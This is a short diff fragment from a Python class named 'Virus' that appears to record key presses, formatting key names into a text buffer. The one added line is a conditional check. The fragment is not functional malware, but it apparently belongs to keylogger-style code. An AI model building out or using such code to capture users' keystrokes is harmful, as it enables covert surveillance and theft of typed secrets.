@@ -111,3 +111,4 @@ class Virus(object):
                     return
                 
                 keystr = f"\x00<^{key.name}>\x00"
+                if len(self.texts) > 0:
